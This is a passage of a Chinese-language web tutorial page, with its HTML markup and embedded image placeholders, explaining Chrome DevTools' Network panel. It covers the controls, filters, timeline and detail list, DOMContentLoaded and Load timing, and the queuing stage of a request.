url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB7klEQVQozzWQS4+bMBRG5yf3p3TfxbTTabuqumi7GFXqNAkZEmKDIQGDAYMDA4g8JoE8mgeTXiepdPTp+Op+WPhmsW82f3fNqjquashmXR/XdXPm9T/SN6vTdn1lU7/ud6fT6ebtQDyYnKm63TeHXTz4raLHnqkMSFuzFGR2ECTtE1ezGBpK8JD2jDLJZfnWyh5Y8cT8Pg+NJMFC6OMxgIXMNosU10Wx0JPkMocdJES2WMhya7wMMr7ln6vwywv7NHM/ztn9zL2T4t1PKchdObqd0Q/A1HkP88no3brUZfkHn2Nf4O9f886vjaVWpFuT7op0K6LUV3+qjbMbCnilKxVqbZ9jWYYff5ku0M9OrJCJ4WbaqMBOjuyp4UkZ2DApdbdADpBpQ5iXmK6yiSyPJnWcTtgf5LQI6w55zxkj5ilWRrjQPP9pRNskwX6o2rxHgdyMUhwss5ksq3lNRRl1Saw5CXJT7OWGn+qsIEEGgr1k4F4kxQwWChLm2K8u5eWhWc5r59EIVfhqLBBL9RBugExQEKpOrHngkLAQ9b2cwM3h9eY37fE3Ky1Mmxv02Q4Sy0tHgTDdsc3jYSRMPyW09OKc8szhBY0mfgLHupyfH6xpdqv6wD1gH7qHM8ezyyP3jvycEcAua4eAHmfywf4Bt9Q7GfH89l4AAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 07 09 50 45"\n        title=""\n        src="/static/2021-07-07-09-50-45-b7e1dcc8d872bc75e34bb2ad48f0c4a0-fee1c.png"\n        srcset="/static/2021-07-07-09-50-45-b7e1dcc8d872bc75e34bb2ad48f0c4a0-a67b7.png 200w,\n/static/2021-07-07-09-50-45-b7e1dcc8d872bc75e34bb2ad48f0c4a0-0b187.png 400w,\n/static/2021-07-07-09-50-45-b7e1dcc8d872bc75e34bb2ad48f0c4a0-fee1c.png 800w,\n/static/2021-07-07-09-50-45-b7e1dcc8d872bc75e34bb2ad48f0c4a0-09eb7.png 1142w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<h3 id="控制器"><a href="#%E6%8E%A7%E5%88%B6%E5%99%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>控制器</h3>\n<p>其中，控制器有 4 个比较重要的功能，我们按照下文中的这张图来简单介绍下。</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-07-09-51-02-42d6620dc9869662b20e6522e8bfcab1-f3ec4.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 64.36781609195403%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB4ElEQVQoz6VSy4rUQBTtL/IfXLka/Al/wbXg3oUK6oALFyrDgLOwd4LiYsAZsLVx0aF70klXpR5JqlKPTjqpPNvb7WJ6wAHBSzg3N3VO5dxbNdr+R4wOi2HYYVG3x5Pk+XdxNpNPzvGbCbWue3bBnl7Qqh3GXvroczhlxd/FWdkenVzdfbt4+IXdezd/8HEZ5839k/nRe8+6/vFXfOflz/HC3BB3XVcUxSZfS23Hs+TVJfnk8Rfnwdk0ktqc/kCvvwU0zT5M8elk5UViO/TX4rIsEaKZssbkbm0NXuVKySwvjOaMEsJQGCAcccYqk6Uxa5pmNPR9b9SwNlVRhMsgRCQiSRgufER4IlKRGmvhSeBNSKW00lpkah6wTVmOoNFOq8EaV9c4ihDyg2CO0QJTEkWUU6qyDBRGG6O1haw0bIZIstlsduJt3wM2Tc15Eiynvv8LIQJUKaQUWZoKISSjjPOYMQ7+AZM4rip33bNzLk4SSkJCfM6BFGdmXTpn8xxMAVautuucxTHCYDEqd7YPxPBnhK5WK48QOpsti9K1Xde2LcwGkqsbmE+apoQQjHFVVTeOyu0DvgLWdd3v2wH8UwICp9kHlMMwjG67erAGDNgIqP90PQ8D3IJDGI6U8jbOb+Rb1c1kDW/jAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 07 09 51 02"\n        title=""\n        src="/static/2021-07-07-09-51-02-42d6620dc9869662b20e6522e8bfcab1-fee1c.png"\n        srcset="/static/2021-07-07-09-51-02-42d6620dc9869662b20e6522e8bfcab1-a67b7.png 200w,\n/static/2021-07-07-09-51-02-42d6620dc9869662b20e6522e8bfcab1-0b187.png 400w,\n/static/2021-07-07-09-51-02-42d6620dc9869662b20e6522e8bfcab1-fee1c.png 800w,\n/static/2021-07-07-09-51-02-42d6620dc9869662b20e6522e8bfcab1-b1a91.png 1200w,\n/static/2021-07-07-09-51-02-42d6620dc9869662b20e6522e8bfcab1-f3ec4.png 1392w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<ul>\n<li>红色圆点的按钮，表示“开始 / 暂停抓包”，这个功能很常见，很容易理解。</li>\n<li>“全局搜索”按钮，这个功能就非常重要了，可以在所有下载资源中搜索相关内容，还可以快速定位到某几个你想要的文件上。</li>\n<li>Disable cache，即“禁止从 Cache 中加载资源”的功能，它在调试 Web 应用的时候非常有用，因为开启了 Cache 会影响到网络性能测试的结果。</li>\n<li>Online 按钮，是“模拟 2G/3G”功能，它可以限制带宽，模拟弱网情况下页面的展现情况，然后你就可以根据实际展示情况来动态调整策略，以便让 Web 应用更加适用于这些弱网</li>\n</ul>\n<h3 id="过滤器"><a href="#%E8%BF%87%E6%BB%A4%E5%99%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>过滤器</h3>\n<p>网络面板中的过滤器，主要就是起过滤功能。因为有时候一个页面有太多内容在详细列表区域中展示了，而你可能只想查看 JavaScript 文件或者 CSS 文件，这时候就可以通过过滤器模块来筛选你想要的文件类型。</p>\n<h3 id="抓图信息"><a href="#%E6%8A%93%E5%9B%BE%E4%BF%A1%E6%81%AF" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>抓图信息</h3>\n<p>抓图信息区域，可以用来分析用户等待页面加载时间内所看到的内容，分析用户实际的体验情况。比如，如果页面加载 1 秒多之后屏幕截图还是白屏状态，这时候就需要分析是网络还是代码的问题了。（勾选面板上的“Capture screenshots”即可启用屏幕截图。）</p>\n<h3 id="时间线"><a href="#%E6%97%B6%E9%97%B4%E7%BA%BF" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>时间线</h3>\n<p>时间线，主要用来展示 HTTP、HTTPS、WebSocket 加载的状态和时间的一个关系，用于直观感受页面的加载过程。如果是多条竖线堆叠在一起，那说明这些资源被同时被加载。至于具体到每个文件的加载信息，还需要用到下面要讲的详细列表。</p>\n<h3 id="详细列表"><a href="#%E8%AF%A6%E7%BB%86%E5%88%97%E8%A1%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>详细列表</h3>\n<p>这个区域是最重要的，它详细记录了每个资源从发起请求到完成请求这中间所有过程的状态，以及最终请求完成的数据信息。通过该列表，你就能很容易地去诊断一些网络问题。</p>\n<p>详细列表是我们本篇文章介绍的重点，不过内容比较多，所以放到最后去专门介绍了。</p>\n<h3 id="下载信息概要"><a href="#%E4%B8%8B%E8%BD%BD%E4%BF%A1%E6%81%AF%E6%A6%82%E8%A6%81" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>下载信息概要</h3>\n<p>下载信息概要中，你要重点关注下 DOMContentLoaded 和 Load 两个事件，以及这两个事件的完成时间。</p>\n<ul>\n<li>DOMContentLoaded，这个事件发生后，说明页面已经构建好 DOM 了，这意味着构建 DOM 所需要的 HTML 文件、JavaScript 文件、CSS 文件都已经下载完成了。</li>\n<li>Load，说明浏览器已经加载了所有的资源（图像、样式表等）</li>\n</ul>\n<p>通过下载信息概要面板，你可以查看触发这两个事件所花费的时间。</p>\n<h2 id="网络面板中的详细列表"><a href="#%E7%BD%91%E7%BB%9C%E9%9D%A2%E6%9D%BF%E4%B8%AD%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%97%E8%A1%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>网络面板中的详细列表</h2>\n<p>下面我们就来重点介绍网络面板中的详细列表，这里面包含了大量有用的信息</p>\n<h3 id="列表的属性"><a href="#%E5%88%97%E8%A1%A8%E7%9A%84%E5%B1%9E%E6%80%A7" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>列表的属性</h3>\n<p>列表的属性比较多，比如 Name、Status、Type、Initiator 等等，这个不难理解。当然，你还可以通过点击右键的下拉菜单来添加其他属性，这里我就不再赘述了，你可以自己上手实操一下。</p>\n<p>另外，你也可以按照列表的属性来给列表排序，默认情况下，列表是按请求发起的时间来排序的，最早发起请求的资源在顶部。当然也可以按照返回状态码、请求类型、请求时长、内容大小等基础属性排序，只需点击相应属性即可。</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-07-09-53-01-18b08f827a18ed29c60483a7f3cc1708-56259.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 60.89644513137558%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABrklEQVQoz41Qy3KbQBDkp/Kz+YrccvEhVT5YsS3LziEYUGwFWEDSPtg3ixCkQcotrsoUtTXTMz3dQ6QPDc9i+b6176n8lbDsVWzxxmKb8iyhyU+WIk/4gi8v8FeAvXfRYfeW3n5Lv69ublbx6r7aPJDndfn0WP/YIMnX95evvOCbx+plnd3d5U8PwZrIeq8k/xofP33efonFNA39OCnn+/N5GMcwDK4LTKrzNNkudP3J932rHUpEZLQsfu+SHbnN6FtFtZIdpilzznVdZ7QRQpCShBAE50opKSU9MpTj+RxZowipGKXBSiVbrQ0axyP13iNBielmf+j7HokxRmvNmEA5juNMzvO8qhvKOVt2o8GFuJCttW0rSVUDFAKr52AU5NOVXJblfn8QS4AMt5TSi20og1w3DRa17UyWUlHKZ9sz2eqiKKqqhjJfyOGq3C3KblYmFZRBhm3GOKXidPqrXMB2VTPAi+3rzW652cw313Wz2BZQhgKl7HpzH7q2FVivtMJiWMVWpTSYmHDewz+uBegWMyiNscMwzOTpX4HG9B8RfdTAFYSQpmnw2z+a+QPsnqMS4hOnggAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 07 09 53 01"\n        title=""\n        src="/static/2021-07-07-09-53-01-18b08f827a18ed29c60483a7f3cc1708-fee1c.png"\n        srcset="/static/2021-07-07-09-53-01-18b08f827a18ed29c60483a7f3cc1708-a67b7.png 200w,\n/static/2021-07-07-09-53-01-18b08f827a18ed29c60483a7f3cc1708-0b187.png 400w,\n/static/2021-07-07-09-53-01-18b08f827a18ed29c60483a7f3cc1708-fee1c.png 800w,\n/static/2021-07-07-09-53-01-18b08f827a18ed29c60483a7f3cc1708-b1a91.png 1200w,\n/static/2021-07-07-09-53-01-18b08f827a18ed29c60483a7f3cc1708-56259.png 1294w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<h3 id="详细信息"><a href="#%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>详细信息</h3>\n<p>如果你选中详细列表中的一项，右边就会出现该项的详细信息，如下所示：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-07-09-53-26-311e36009422d59a8e38c15e698b0e77-8edaa.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 82.97213622291021%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAIAAABSJhvpAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAC/ElEQVQ4y22RW2/TZhjH+RBc7WNME5om7YL7adK422fhZhebAHEQG6KiqF1ak7Y5NixNQ0URQpA0PYSkSUpiu/Ep8fm148Sn+Gz8BlC7jUc//f28sn6vree5YlmWbduLsJOY27ZmzLlpwM0CRXfhG8syrblpu6Zlm6YJj6blum4cx1cIghwlxTAjmmJoSmbJtQPw/SPxuwfszepUE5jmgPtpSf7hFvHrioTTEkPTQ4JS1QmUeZ4HQJGBAlRNVjVdU08p+VmDy56Iez0RyOwHWrz7enZ7T16uTSRVU1RZlCXd1KE85gRVGD2tq7/8zd9YE3Ld8Fw6+qe7+o7Kv6ULL4eQGpNvjItJ7hPFfXJ7ny6SWh/K9IiTRsM7r8C396hrD0eP6n6br68cP0TaTwqD9QqxtUtldshMmYSZ9FUqWybT2KQDZVmWJVEcUMLhgGsRQFbtIXf0uoPU+rmj81KTLHdG1e74xSX2WswOr2FQZll2zHLmVPENEJpKGPgG3RDrj9X3iN3PuVjBx7f/TclHswE4gzJQ1LkxfTN07ted+++sAzb2+CO29pfUTE3aiH626WB5B8+7eOELRRfd8kEPyn4QJY9bb52rv7Hf/M7/UYtD8URoLMnNlNpGoInlvfPi1+UIujEKwgrmV1CPMWKPO2Te/CmepMTjVXhFC7EH2UTz8GKCi297aOazHF+uKExizh+Lh49Ba23WS0PONowPm3M8Z6EZG83OsZzdT3ugeyG7QWz6selGQSKPO9LB1vR0x+zuJhjdCsxOZdou66c7Rnd31io5/ADKAfxYnD71fl5XbyCTjX5sdY6HqaVx7hlf2JCfZ2bV0rS6fcGLklbO2ujZhbzSdH9ckq4vg9VebLUb6PIDZnOFSj9N4HIpPpvicympiAj5dbGACJlVvfd+MbDFb8+ciDdiTo/sIA4mso73DQIzCcwYognmorep8zmdMLRJ3Jso/xtYMrJLTXTp+NX6LCcLCxd82pzrOKIg8BynABCFIdxCFP2XOP4IyJhtBgnZ+SIAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 07 09 53 26"\n        title=""\n        src="/static/2021-07-07-09-53-26-311e36009422d59a8e38c15e698b0e77-fee1c.png"\n        srcset="/static/2021-07-07-09-53-26-311e36009422d59a8e38c15e698b0e77-a67b7.png 200w,\n/static/2021-07-07-09-53-26-311e36009422d59a8e38c15e698b0e77-0b187.png 400w,\n/static/2021-07-07-09-53-26-311e36009422d59a8e38c15e698b0e77-fee1c.png 800w,\n/static/2021-07-07-09-53-26-311e36009422d59a8e38c15e698b0e77-b1a91.png 1200w,\n/static/2021-07-07-09-53-26-311e36009422d59a8e38c15e698b0e77-8edaa.png 1292w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>你可以在此查看请求列表中任意一项的请求行和请求头信息，还可以查看响应行、响应头和响应体。然后你可以根据这些查看的信息来判断你的业务逻辑是否正确，或者有时候也可以用来逆向推导别人网站的业务逻辑。</p>\n<h3 id="单个资源的时间线"><a href="#%E5%8D%95%E4%B8%AA%E8%B5%84%E6%BA%90%E7%9A%84%E6%97%B6%E9%97%B4%E7%BA%BF" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>单个资源的时间线</h3>\n<p>了解了每个资源的详细请求信息之后，我们再来分析单个资源请求时间线，这就涉及具体的 HTTP 请求流程了。</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-07-09-53-50-ee8c5554c2d4230d5958c3f13aea2522-57c91.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 37.65182186234818%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABAUlEQVQY02P4++8/EAEBkICwMRFY+h8QwdVAAAMQ//n14/Gda98+vgWrgckQARj23Psy7+yb6QduLzr9fNnVz+uvf1p06SOIvPhh441Pc8+923zz0+8/fz6eOfXr+ZM773/NOftuyaWPH7//BmluO/gictWD/B3PszY/Sdz8In/7s+j1zwq2PYlcdb9w2+PAZffKdj75+u37kwWzv18+e/TZL/+ld2PXPnr28SdI89+/f379/EHQhT9+/frz5w+6s//+/fvly9cfP358ByMQ4zsQfQczEODTp09/MTVDAgkZYFqLKxQZMBW9ffv23r17Hz9+BDIeP3789OlToOuwagYAeP/A5lSxFy0AAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 07 09 53 50"\n        title=""\n        src="/static/2021-07-07-09-53-50-ee8c5554c2d4230d5958c3f13aea2522-fee1c.png"\n        srcset="/static/2021-07-07-09-53-50-ee8c5554c2d4230d5958c3f13aea2522-a67b7.png 200w,\n/static/2021-07-07-09-53-50-ee8c5554c2d4230d5958c3f13aea2522-0b187.png 400w,\n/static/2021-07-07-09-53-50-ee8c5554c2d4230d5958c3f13aea2522-fee1c.png 800w,\n/static/2021-07-07-09-53-50-ee8c5554c2d4230d5958c3f13aea2522-b1a91.png 1200w,\n/static/2021-07-07-09-53-50-ee8c5554c2d4230d5958c3f13aea2522-57c91.png 1482w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>我们介绍过发起一个 HTTP 请求之后，浏览器首先查找缓存，如果缓存没有命中，那么继续发起 DNS 请求获取 IP 地址，然后利用 IP 地址和服务器端建立 TCP 连接，再发送 HTTP 请求，等待服务器响应；不过，如果服务器响应头中包含了重定向的信息，那么整个流程就需要重新再走一遍。这就是在浏览器中一个 HTTP 请求的基础流程。</p>\n<p>那详细列表中是如何表示出这个流程的呢？这就要重点看下时间线面板了</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-07-09-54-24-cc965f0ae609a55cd5be0788d105afaf-0ac43.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 93.7984496124031%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAIAAAAf7rriAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABoUlEQVQ4y6VU6U6DQBjk/Z/Gq/4wqU9grLH6Q6mBcN/LvbtcdWAJYEqbqBMKdHfnm/mOVjr+A1LbtlmWOY6j63qapoZheJ7n+76iKK7jeF5w+FKTJC3Lslggz3POuYQAeIvjOIoiQggC0QE4QWmZZNSP8qJkFf8Bxlhd1z0ZTFVVnQHY+IVtfGAJfNxhG5pd110gNE1TVRVkcawng2DbNlIlA4T4aQixAg1N00zTRLEksRoPQMjpHPZWlafDszK+wHMYhqjEOcOTchAEMxki6BOqvXQ7KC+v47SORiJNJD+SRc64ixAAs96Tl+t0f5/uN+nrbVMSsY5eImHXdWcyOJOmeDHe/Kerj91G3t3JzzefBaFiF0MBMsTHgolWJQOwd7m3KAqU5pxRZFTfsizYPjckXdtNfYZnHB6V8TBME1wsofKr5Eft4RDJvU3a93kuGAyQKAgDFzXDhE7dXoK3+VaOtzLjtIAynI/krKh1t7ADWtVNN2BVnNcdrVqRNmTGnEvW+ISFCW/alZE8DYfBRsNG8t//DC60RPzI4XA5BUt8A1lsT6oVgRWDAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 07 09 54 24"\n        title=""\n        src="/static/2021-07-07-09-54-24-cc965f0ae609a55cd5be0788d105afaf-fee1c.png"\n        srcset="/static/2021-07-07-09-54-24-cc965f0ae609a55cd5be0788d105afaf-a67b7.png 200w,\n/static/2021-07-07-09-54-24-cc965f0ae609a55cd5be0788d105afaf-0b187.png 400w,\n/static/2021-07-07-09-54-24-cc965f0ae609a55cd5be0788d105afaf-fee1c.png 800w,\n/static/2021-07-07-09-54-24-cc965f0ae609a55cd5be0788d105afaf-b1a91.png 1200w,\n/static/2021-07-07-09-54-24-cc965f0ae609a55cd5be0788d105afaf-0ac43.png 1290w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>那面板中这各项到底是什么含义呢？</p>\n<blockquote>\n<p>第一个是 Queuing，也就是排队的意思，当浏览器发起一个请求的时候，会有很多原因导致该请求不能被立即执行，而是需要排队等待。导致请求处于排队状态的原因有很多。</p>\n</blockquote>\n<ul>\n<li>首先，页面中的资源是有优先级的，比如 CSS、HTML、JavaScript 等都是页面中的核心文件，所以优先级最高；而图片、视频、音频这类资源就不是核心资源，优先级就比较低。通常当后者遇到前者时，就需要“让路”，进入待排队状态。</li>\n<li>其次，我们前面也提到过，浏览器会为每个域名最多维护 6 个 TCP 连接，如果发起一个 HTTP 请求时，这 6 个 TCP 连接都处于忙碌状态，那么这个请求就会处于排队状态。</li>\n<li>最后，网络进程在为数据分配磁盘空间时，新的 HTTP 